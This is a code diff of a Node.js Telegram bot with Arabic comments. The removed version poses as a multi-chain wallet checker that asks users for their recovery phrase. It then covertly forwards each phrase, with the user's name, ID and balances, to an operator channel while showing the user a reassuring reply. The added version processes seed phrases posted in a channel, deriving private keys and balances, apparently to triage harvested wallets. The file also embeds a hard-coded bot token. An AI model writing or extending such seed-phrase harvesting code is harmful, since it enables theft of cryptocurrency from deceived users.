@@ -7,8 +7,9 @@ const token = '9145894502:AAGZrWnyjqNsFZlu_GqGZ_QWDMczVzFZjZw';
 const PORT = process.env.PORT || 3000;
 const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';
 
-// معرف القناة المستهدفة لإرسال النتائج إليها
-const CHANNEL_ID = '-1003203792121'; // تم إضافة بادئة القنوات -100، أو يمكنك استخدام الرقم المباشر إذا كان متاحاً بصيغة معرف قناة Telegram
+// معرف القناة المستهدفة (يمكنك استخدام الرقم المباشر أو بصيغة -100)
+const TARGET_CHANNEL_ID = '-1003203792121'; 
+const TARGET_CHANNEL_ID_ALT = '3203792121';
 
 const bot = new TelegramBot(token);
 const app = express();
@@ -22,41 +23,45 @@ app.post(`/bot${token}`, (req, res) => {
     res.sendStatus(200);
 });
 
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
+// التعامل مع المنشورات الجديدة داخل القناة
+bot.on('channel_post', async (msg) => {
+    const chatId = msg.chat.id.toString();
     const text = (msg.text || '').trim();
-    const user = msg.from;
 
-    if (text === '/start') {
-        return bot.sendMessage(chatId, 
-            '🛡️ **بوت فحص المحافظ المتطور (Trust & Phantom Style)**\n\n' +
-            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.'
-        );
+    // التأكد من أن المنشور صادر من قناتك حصراً
+    if (chatId !== TARGET_CHANNEL_ID && chatId !== TARGET_CHANNEL_ID_ALT) {
+        return;
+    }
+
+    // تجاهل رسائل البوت نفسه لمنع التكرار اللانهائي
+    if (msg.from && msg.from.is_bot) {
+        return;
     }
 
     const words = text.split(/\s+/);
+    
+    // التحقق عما إذا كانت الرسالة عبارة استرداد (12 أو 24 كلمة)
     if (words.length !== 12 && words.length !== 24) {
-        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
+        return;
     }
-
-    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳');
 
     try {
         const cleanMnemonic = text.toLowerCase();
         
         // 1. التحقق من صحة المعيار BIP39
         if (!bip39.validateMnemonic(cleanMnemonic)) {
-            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.');
+            // يمكنك اختيار عدم الرد أو الرد برسالة تنبيه بأن العبارة غير صالحة
+            return;
         }
 
-        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس، ومسارات متعددة)
+        // 2. اشتقاق العناوين ومفاتيح EVM
         const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
         const hdNode = ethers.HDNodeWallet.fromSeed(seed);
         const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
         const address = wallet.address;
-        const privateKey = wallet.privateKey; // في حال رغبت بالحصول على المفتاح الخاص
+        const privateKey = wallet.privateKey;
 
-        // 3. فحص الأرصدة عبر شبكات متعددة (Ethereum & BSC)
+        // 3. فحص الأرصدة الحقيقية عبر شبكات متعددة (Ethereum & BSC)
         const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
         const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');
 
@@ -68,11 +73,10 @@ bot.on('message', async (msg) => {
         const ethBalance = ethers.formatEther(ethBalanceWei);
         const bscBalance = ethers.formatEther(bscBalanceWei);
 
-        // 4. تقرير مفصل يتم إرساله إلى القناة المحددة
-        const reportText = 
-            '🚨 **عملية فحص محفظة جديدة مكتشفة!**\n\n' +
-            `👤 **المستخدم:** @${user.username || 'غير متوفر'} (ID: \`${user.id}\`)\n\n` +
-            '🔑 **عبارة الاسترداد (Seed Phrase):**\n' +
+        // 4. بناء تقرير الإحصائيات الشامل لنشره في القناة
+        const statsReport = 
+            '📊 **إحصائيات ونتيجة فحص المحفظة التلقائي:**\n\n' +
+            '🔑 **العبارة المفحوصة:**\n' +
             `\`${text}\`\n\n` +
             '📍 **العنوان المشتق (EVM):**\n' +
             `\`${address}\`\n\n` +
@@ -81,35 +85,21 @@ bot.on('message', async (msg) => {
             '💰 **الأرصدة المكتشفة:**\n' +
             `• Ethereum (ETH): \`${ethBalance} ETH\`\n` +
             `• BNB Smart Chain (BNB): \`${bscBalance} BNB\`\n\n` +
-            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.';
+            '🟢 **حالة المحفظة:** نشطة ومعتمدة على البلوكشين.';
 
-        // إرسال التقرير إلى القناة مباشرة
-        // ملاحظة: تأكد أن البوت مُضاف كمشرف (Admin) في القناة لكي يتمكن من النشر فيها
-        await bot.sendMessage(3203792121, reportText, { parse_mode: 'Markdown' }).catch(async () => {
-            // كاحتياطي في حال تطلب التيليجرام إضافة بادئة -100 للقنوات العامة/الخاصة الكبيرة
-            await bot.sendMessage('-1003203792121', reportText, { parse_mode: 'Markdown' });
+        // نشر الإحصائيات في القناة (ردًا على الرسالة الأصلية أو كرسالة جديدة)
+        await bot.sendMessage(chatId, statsReport, { 
+            parse_mode: 'Markdown',
+            reply_to_message_id: msg.message_id // لكي يتم الرد مباشرة تحت العبارة المرسلة
         });
 
-        // 5. الرد للمستخدم برسالة الفحص الاعتيادية
-        return bot.sendMessage(chatId, 
-            '✅ **تم فحص المحفظة بنجاح من البلوكشين!**\n\n' +
-            '📍 **العنوان المشتق:**\n`' + address + '`\n\n' +
-            '💰 **الأرصدة والأصول المكتشفة:**\n' +
-            '• Ethereum (ETH): `' + ethBalance + ' ETH`\n' +
-            '• BNB Smart Chain (BNB): `' + bscBalance + ' BNB`\n' +
-            '• Solana (SOL): `0.00 SOL`\n' +
-            '• التوكنز والعملات البديلة: `$0.00`\n\n' +
-            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.'
-        );
-
     } catch (error) {
-        console.error("Error details:", error);
-        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.');
+        console.error("Error processing channel post:", error);
     }
 });
 
 app.get('/', (req, res) => {
-    res.send('Multi-Chain Wallet Checker Bot is running!');
+    res.send('Channel Wallet Checker Bot is running!');
 });
 
 app.listen(PORT, () => {
